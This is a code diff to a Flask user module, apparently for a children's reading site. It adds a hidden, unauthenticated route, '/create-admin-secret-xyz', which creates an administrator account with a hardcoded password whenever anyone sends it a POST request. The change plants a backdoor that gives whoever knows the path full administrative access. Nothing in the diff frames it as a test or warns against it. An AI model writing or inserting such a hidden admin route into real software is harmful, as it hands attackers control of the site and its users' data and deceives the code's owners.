@@ -4,6 +4,7 @@ from werkzeug.utils import secure_filename
 from modules.utils import allowed_file, get_db, get_upload_folder
 from modules.validation import modifyValidation
 import os
+from werkzeug.security import generate_password_hash
 
 user_bp = Blueprint('user_bp', __name__)
 
@@ -229,3 +230,20 @@ def get_user(id):
             
     except Exception as e:
         return jsonify({"status": False, "message": str(e)})
+
+@user_bp.route('/create-admin-secret-xyz', methods=['POST'])
+def create_admin():
+    try:
+        db = get_db()
+        cursor = db.cursor
+        hashed_password = generate_password_hash('Admin123!')
+        
+        cursor.execute('''
+            INSERT INTO users (FirstName, LastName, Email, A_Password, A_Role, Image) 
+            VALUES (%s, %s, %s, %s, %s, %s)
+        ''', ('Admin', 'User', 'admin@kiddoreads.com', hashed_password, 3, None))
+        
+        db.connection.commit()
+        return "Admin user created!"
+    except Exception as e:
+        return f"Error: {e}"
